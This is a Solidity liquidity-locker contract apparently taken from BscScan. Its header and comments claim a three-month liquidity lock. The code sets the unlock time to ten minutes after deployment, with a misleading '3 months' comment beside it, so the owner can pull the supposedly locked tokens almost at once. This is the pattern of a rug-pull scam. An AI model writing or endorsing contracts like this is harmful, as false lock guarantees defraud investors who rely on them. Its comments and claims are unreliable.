/**
 *Submitted for verification at BscScan.com on 2022-03-28
*/

/**
 *Submitted for verification at BscScan.com on 2021-04-19
*/

// LP Locker Contract
// 3 MONTH for Liquidity Lock


pragma solidity ^0.4.26;

contract _ERC20Basic {
  function balanceOf(address _owner) public returns (uint256 balance);
  function transfer(address to, uint256 value) public returns (bool);
}


contract LPLocker  {
    address owner;

    address tokenAddress = 0x4091d88bc800556416df419184fa90dc0e4e8808; 
    uint256 unlockUnix = now + 10 minutes; // 3 months

    _ERC20Basic token = _ERC20Basic(tokenAddress);

    constructor() public {
        owner = msg.sender;
    }

    function unlockLPTokens() public {
        require(owner == msg.sender, "You are not owner");
        require( now > unlockUnix, "Still locked");
        token.transfer(owner, token.balanceOf(address(this)));
    }

    //Control
    function getLockAmount() public view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function getTokenAddress()  public view returns (address) {
        return tokenAddress;
    }

    function getUnlockTimeLeft() public view returns (uint) {
        return unlockUnix - now;
    }
}